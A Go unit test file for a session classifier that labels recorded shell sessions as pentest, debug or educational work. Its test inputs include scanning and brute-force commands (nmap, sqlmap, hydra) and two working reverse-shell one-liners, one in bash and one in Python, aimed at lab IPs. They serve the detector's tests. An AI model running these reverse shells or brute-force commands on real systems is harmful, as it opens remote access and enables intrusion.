package detect

import (
	"strings"
	"testing"

	"github.com/perxibes/termdossier/internal/store"
)

func TestDetect_PentestSession(t *testing.T) {
	events := []store.Event{
		{Stdin: "nmap -sV 10.10.10.1"},
		{Stdin: "gobuster dir -u http://10.10.10.1"},
		{Stdin: "sqlmap -u http://10.10.10.1/vuln?id=1"},
		{Stdin: "hydra -l admin -P passwords.txt ssh://10.10.10.1"},
	}

	result := Detect(events)
	if result.Type != TypePentest {
		t.Errorf("Detect pentest: got %q, want %q", result.Type, TypePentest)
	}
	if result.Confidence < 0.5 {
		t.Errorf("Detect pentest confidence too low: %.2f", result.Confidence)
	}
}

func TestDetect_DebugSession(t *testing.T) {
	events := []store.Event{
		{Stdin: "go build ./..."},
		{Stdin: "go test ./internal/..."},
		{Stdin: "git commit -m 'fix bug'"},
		{Stdin: "npm test"},
		{Stdin: "docker build -t myapp ."},
	}

	result := Detect(events)
	if result.Type != TypeDebug {
		t.Errorf("Detect debug: got %q, want %q", result.Type, TypeDebug)
	}
	if result.Confidence < 0.3 {
		t.Errorf("Detect debug confidence too low: %.2f", result.Confidence)
	}
}

func TestDetect_HTBIPDetection(t *testing.T) {
	events := []store.Event{
		{Stdin: "nmap 10.10.14.5"},
		{Stdin: "curl http://10.129.45.12"},
	}

	result := Detect(events)
	if result.Type != TypePentest {
		t.Errorf("Detect HTB IP: got %q, want %q", result.Type, TypePentest)
	}

	found := false
	for _, r := range result.Reasons {
		if containsStr(r, "HTB") || containsStr(r, "CTF") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected HTB/CTF reason in detection results")
	}
}

func TestDetect_ReverseShell(t *testing.T) {
	events := []store.Event{
		{Stdin: "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"},
	}

	result := Detect(events)
	if result.Type != TypePentest {
		t.Errorf("Detect revshell: got %q, want %q", result.Type, TypePentest)
	}
}

func TestDetect_GenericSession(t *testing.T) {
	events := []store.Event{
		{Stdin: "echo hello"},
		{Stdin: "cat /etc/hostname"},
		{Stdin: "date"},
	}

	result := Detect(events)
	if result.Type != TypeEducational {
		t.Errorf("Detect generic: got %q, want %q", result.Type, TypeEducational)
	}
}

func TestDetect_EmptySession(t *testing.T) {
	result := Detect(nil)
	if result.Type != TypeEducational {
		t.Errorf("Detect empty: got %q, want %q", result.Type, TypeEducational)
	}
}

func containsStr(s, sub string) bool {
	return len(s) >= len(sub) && strings.Contains(s, sub)
}

func TestDetect_MixedSignals(t *testing.T) {
	// Mix of pentest and dev tools — pentest should win with higher weight
	events := []store.Event{
		{Stdin: "nmap -sV 10.10.10.1"},
		{Stdin: "go build ./..."},
		{Stdin: "sqlmap -u http://target/vuln?id=1"},
		{Stdin: "git commit -m 'wip'"},
		{Stdin: "hydra -l admin -P pass.txt ssh://target"},
	}

	result := Detect(events)
	if result.Type != TypePentest {
		t.Errorf("Detect mixed: got %q, want %q (pentest should dominate)", result.Type, TypePentest)
	}
}

func TestDetect_SudoPrefix(t *testing.T) {
	events := []store.Event{
		{Stdin: "sudo nmap -sV target"},
		{Stdin: "sudo gobuster dir -u http://target"},
	}

	result := Detect(events)
	if result.Type != TypePentest {
		t.Errorf("Detect sudo: got %q, want %q", result.Type, TypePentest)
	}
}

func TestDetect_ConfidenceRange(t *testing.T) {
	events := []store.Event{
		{Stdin: "nmap -sV target"},
	}

	result := Detect(events)
	if result.Confidence < 0 || result.Confidence > 1 {
		t.Errorf("Confidence out of range: %.2f", result.Confidence)
	}
}

func TestDetect_ReasonsNotEmpty(t *testing.T) {
	events := []store.Event{
		{Stdin: "nmap -sV target"},
		{Stdin: "gobuster dir -u http://target"},
	}

	result := Detect(events)
	if len(result.Reasons) == 0 {
		t.Error("expected reasons to be populated for detected session")
	}
}

func TestDetect_DuplicateToolsCountOnce(t *testing.T) {
	// Running nmap 10 times should not inflate the score
	events := make([]store.Event, 10)
	for i := range events {
		events[i] = store.Event{Stdin: "nmap scan" + string(rune('0'+i))}
	}

	result := Detect(events)
	// With deduplication, score should be nmap weight (0.3), confidence = 0.3/(0.3+1) ≈ 0.23
	// This is below 0.3, so it falls back to educational
	if result.Confidence > 0.5 {
		t.Errorf("confidence too high for repeated tool: %.2f", result.Confidence)
	}
}

func TestDetect_PythonReverseShell(t *testing.T) {
	events := []store.Event{
		{Stdin: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);pty.spawn("/bin/bash")'`},
	}

	result := Detect(events)
	if result.Type != TypePentest {
		t.Errorf("Detect python revshell: got %q, want %q", result.Type, TypePentest)
	}
}
